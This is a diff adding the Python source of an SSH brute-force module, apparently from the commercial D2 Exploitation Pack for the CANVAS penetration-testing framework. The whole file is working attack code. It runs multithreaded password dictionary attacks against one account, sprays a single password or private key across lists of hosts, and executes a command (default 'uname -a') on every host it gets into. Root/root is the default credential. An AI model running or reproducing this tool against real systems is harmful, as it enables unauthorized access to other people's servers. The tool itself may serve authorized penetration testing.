@@ -1,0 +1,373 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2009
+#
+
+import os
+import getopt
+import sys
+import socket
+import struct
+import string
+
+sys.path.append('.')
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+
+NAME = 'D2 SSH bruteforcer'
+DESCRIPTION='Threaded SSH bruteforcer'
+VERSION='0.2'
+
+DOCUMENTATION = {}
+DOCUMENTATION['VENDOR'] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION['Date public'] = ""
+DOCUMENTATION['References'] = ""
+DOCUMENTATION['Versions Affected'] = ""
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = ""
+DOCUMENTATION["CVE Url"] = ""
+DOCUMENTATION["Notes"] = """
+Usage: 3rdparty/D2SEC/exploits/d2sec_sshbrute/d2sec_sshbrute.py -t host -p port -O mode:[0|1|2] -O user:<user> -O password:<password> -O filename:<file pathname> -O keyfile:<file pathname> -O keytype:[rsa|dss] -O command:<command> -O threadcount:5
+
+with __mode__:
+
+- mode 0: brute forcing a user with a dictionnary.
+Args user et filename (passwords list) needed.
+
+- mode 1: brute forcing some hosts with specific user/password.
+Args user, password and filename (hosts list) needed. Command can be
+specified.
+
+- mode 2: brute forcing some hosts with specific user/key.
+Args user, keytype, keyfile, filename (hostslist) (and password if key
+is protected) needed. Command can be specified.
+"""
+
+PROPERTY={}
+PROPERTY['TYPE']='Tools'
+PROPERTY['SITE']='Remote'
+PROPERTY['ARCH'] = [ ["Linux"], ["Windows"], ["Solaris"], ["AIX"], ["FreeBSD"], ["MacOSX"], ["HP-UX"] ]
+
+import libs.paramiko as paramiko
+import threading
+
+class theexploit(tcpexploit):
+
+	def __init__(self):
+		tcpexploit.__init__(self)
+		self.work_done = False
+		self.port = 22
+		self.fctmode = None
+		self.mode = 0
+		self.user = "root"
+		self.password = "root"
+		self.filename = None
+		self.keyfile = None
+		self.keytype = "rsa"
+		self.command = "uname -a"
+		self.mylock = threading.RLock()
+		self.found_password = None
+		self.threadcount = 5
+
+	def start_workers(self, function):
+		self.log("Spawning %d threads ..." % self.threadcount)
+		for i in range(0, self.threadcount):
+			thread = threading.Thread(target=function)
+			thread.start()
+
+	def wait4workers(self):
+		while (self.work_done != True):
+			time.sleep(1)
+
+	def get_next_value(self):
+		while 1:
+			try:
+				value = self.fd.readline()
+				if value == '':
+					self.no_more_value = True
+					break
+				value = value.strip()
+			except IOError:
+				break
+			yield value 
+		return
+
+	def connect_to_host(self, host):
+		sock = self.gettcpsock()
+		try:
+			sock.connect((host, self.port))
+		except Exception, e:
+			self.log("[D2 LOG] Connection failed: %s" % e)
+			return None
+		return sock
+
+	def open_ssh_transport(self, sock):
+		t = paramiko.Transport(sock)
+		try:
+			t.connect()
+		except paramiko.SSHException, e:
+			if "Error reading SSH protocol" in str(e):
+				self.log("[D2 LOG] Connection has been overwhelmed (or is not SSH!)")
+				t.close()
+				self.log("[D2 LOG] Thread sleeping to let server recover")
+				time.sleep(120)
+				return None
+		return t
+
+	def close_ssh_transport(self, t):
+		t.close()
+
+	def run_a_command(self, t):
+		chan = t.open_session()
+		if chan is None:
+			return None
+		chan.exec_command(self.command)
+		
+		data = ''
+		while True:
+			try:
+				tmp = chan.recv(4096)
+				data += tmp
+				if not data or len(tmp) < 4096:
+					break
+			except paramiko.SSHException, e:
+				break
+
+		chan.close()
+		return data
+
+	def bruteforce_password_user(self):
+		password = 'A'
+		no_more_password = False
+		max_tries_per_connect = 5
+
+		while password != None or self.work_done != True:
+			if self.work_done == True: break
+			sock = self.connect_to_host(self.host)
+			if sock == None: return
+			t = self.open_ssh_transport(sock)
+			if t == None: continue
+			
+			for i in xrange(0, max_tries_per_connect):	
+				self.mylock.acquire()
+				try:
+					password = self.passwords.next()
+				except StopIteration:
+					no_more_password = True
+				self.mylock.release()
+				if no_more_password:
+					self.work_done = True
+					return
+				try:
+					self.log("[D2 LOG] Trying %s:%s" % (self.user, password))
+					t.auth_password(username=self.user, password=password)
+				except paramiko.SSHException, e:
+					#self.log("SSH Exception: %s" % e)	
+					pass
+				else:
+					#self.log("Found password: %s" % password)
+					self.found_password = password
+					self.work_done = True
+
+			self.close_ssh_transport(t)
+		return
+
+	def bruteforce_user_password_host(self):
+		host = '1.1.1.1'
+		no_more_host = False
+
+		while host != None or self.work_done != True:
+			if self.work_done == True: break
+			self.mylock.acquire()
+			try:
+				host = self.hosts.next()
+			except:
+				no_more_host = True			
+			self.mylock.release()
+			if no_more_host:
+				self.work_done = True
+				return
+
+			sock = self.connect_to_host(host)
+			if sock == None: continue
+			t = self.open_ssh_transport(sock)
+			if t == None: continue
+
+			try:
+				self.log("[D2 LOG] Trying on %s" % host)
+				t.auth_password(username=self.user, password=self.password)
+			except paramiko.SSHException, e:
+				#self.log("SSH Exception: %s" % e)  
+				pass
+			else:
+				self.log("[%s] Host valid" % host)
+				if self.command: 
+					data = self.run_a_command(t)
+					if data:
+						self.log("[%s] $ %s" % (host, self.command))
+						self.log("%s" % data)
+						self.log("\n")
+
+			self.close_ssh_transport(t)
+		return
+
+	def bruteforce_user_key_host(self):
+		host = '1.1.1.1'
+		no_more_host = False
+
+		while host != None or self.work_done != True:
+			if self.work_done == True: break
+			self.mylock.acquire()
+			try:
+				host = self.hosts.next()
+			except:
+				no_more_host = True
+			self.mylock.release()
+			if no_more_host:
+				self.work_done = True
+				return
+
+			if self.keytype == 'rsa': 
+				privkey = paramiko.RSAKey.from_private_key_file(self.keyfile)
+			if self.keytype == 'dsa': 
+				privkey = paramiko.DSSKey.from_private_key_file(self.keyfile)
+
+			sock = self.connect_to_host(host)
+			if sock == None: continue
+			t = self.open_ssh_transport(sock)
+			if t == None: continue
+
+			try:
+				self.log("[D2 LOG] Trying on %s" % host)
+				t.auth_publickey(self.user, privkey)
+			except paramiko.SSHException, e:
+				#self.log("SSH Exception: %s" % e)  
+				pass
+			else:
+				self.log("[%s] Host valid" % host)
+				if self.command:
+					data = self.run_a_command(t)
+					if data:
+						self.log("[%s] $ %s" % (host, self.command))
+						self.log("%s" % data)
+						self.log("\n")
+
+			self.close_ssh_transport(t)
+		return
+
+	def getargs(self):
+		functions = [ 
+			self.bruteforce_password_user,
+			self.bruteforce_user_password_host,
+			self.bruteforce_user_key_host,
+		]
+			
+		self.host = self.target.interface
+		self.port = int(self.argsDict.get('port', self.port))
+
+		self.filename = self.argsDict.get('filename', self.filename)
+		if self.filename != None:
+			if not os.path.isfile(self.filename):
+				self.log('[D2 LOG] %s not found' % self.filename)
+				return 1
+							
+		self.mode = int(self.argsDict.get('mode', self.mode))
+		self.threadcount = int(self.argsDict.get('threadcount', self.threadcount))
+		self.user = self.argsDict.get('user', self.user)
+		self.command = self.argsDict.get('command', self.command)
+		if self.mode > -1 and self.mode < len(functions):
+			self.fctmode = functions[self.mode]
+		else:
+			self.log('[D2 LOG] Mode invalid (0-3)')
+			return 1
+			
+		if self.mode == 1:
+			self.password = self.argsDict.get('password', self.password)
+
+		if self.mode == 2:
+			self.keyfile = self.argsDict.get('keyfile', self.keyfile)
+			if not os.path.isfile(self.keyfile):
+				self.log('[D2 LOG] %s not found' % self.keyfile)
+				return 1
+			self.keytype = self.argsDict.get('keytype', self.keytype)
+			self.keytype = string.lower(self.keytype)
+			if self.keytype not in ['rsa', 'dsa']:
+				self.log('[D2 LOG] Key type invalid (only rsa or dsa)')
+				return 1
+			self.password = self.argsDict.get('password', self.password)
+		return 0
+
+	def test_ssh_server(self):
+		self.log('[D2 LOG] Test %s SSH server' % self.host)
+		sock = self.connect_to_host(self.host)
+		if sock == None: 
+			return 1
+		t = paramiko.Transport(sock)
+		try:
+			t.connect()
+		except paramiko.SSHException, e:
+			if "Error reading SSH protocol" in str(e):
+				self.log("[D2 LOG] Connection has been overwhelmed (or is not SSH!)")
+				t.close()
+				return 1
+		return 0
+
+	def run(self):
+		self.no_more_password = False
+
+		if self.getargs():
+			return 0
+
+		if self.test_ssh_server():
+			self.log('[D2 LOG] Failed to run ssh brute force')	
+			return 0
+
+		self.log('[D2 LOG] %s running' % NAME)
+		self.setInfo('[D2 LOG] %s running' % NAME)
+
+		try:
+			self.fd = file(self.filename, 'rb')
+		except Exception, e:
+			self.log("[D2 LOG] %s" % e)
+			return 0
+
+		if self.mode == 0:
+			self.log('[D2 LOG] User %s with password file %s' % (self.user, self.filename)) 
+			self.passwords = self.get_next_value()
+		else:
+			if self.mode == 1:
+				self.log('[D2 LOG] Hosts file %s with user (%s) and password (%s)' % (self.filename, self.user, self.password))
+			if self.mode == 2:
+				self.log('[D2 LOG] Host file %s with a user (%s) and key (%s)' % (self.filename, self.user, self.keyfile))
+			self.hosts = self.get_next_value()
+
+		self.start_workers(self.fctmode)
+		self.wait4workers()
+
+		time.sleep(5)
+
+		if self.found_password != None:
+			self.log('Found working password: %s' % self.found_password)
+
+		self.setInfo('[D2 LOG] %s attacking %s:%d - done' % (NAME, self.host, self.port))
+		return 1
+
+	def usage(self):
+		print 'Usage: %s -t host -p port -O mode:[0|1|2] -O user:<user> -O password:<password> -O filename:<file pathname> -O keyfile:<file pathname> -O keytype:[rsa|dss] -O command:<command> -O threadcount:5\n' % sys.argv[0]
+		print 'with __mode__:\n'
+		print '- mode 0: brute forcing a user with a dictionnary.\nArgs user et filename (passwords list) needed.\n'
+		print '- mode 1: brute forcing some hosts with specific user/password.\nArgs user, password and filename (hosts list) needed. Command can be specified.\n'
+		print '- mode 2: brute forcing some hosts with specific user/key.\nArgs user, keytype, keyfile, filename (hostslist) (and password if key is protected) needed. Command can be specified.\n'
+		sys.exit(0)
+
+if __name__=='__main__':
+  print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
